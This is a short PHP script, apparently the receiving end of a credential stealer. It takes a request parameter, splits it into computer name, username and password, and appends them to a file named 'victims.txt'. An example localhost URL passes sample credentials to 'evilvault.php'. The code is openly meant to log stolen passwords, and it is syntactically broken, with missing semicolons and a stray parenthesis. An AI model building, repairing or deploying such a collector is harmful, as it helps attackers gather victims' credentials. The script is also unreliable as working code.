<?php

$myFile = "victims.txt"
echo "test"
$info = $_REQUEST['info']);
list($computername, $username, $password) = (explode("-", $info));

$message = "Computername: " . $computername . "\n" . "Username: " . $username . "\n" . "Password: " . $password . "\n---------------------------------\n"

$fh = fopen($myFile, 'a');
fwrite($fh, $message."\n");
fclose($fh);
?>

http://localhost:8888/evilvault.php?info=Yannick's Computer-Yannick-1234567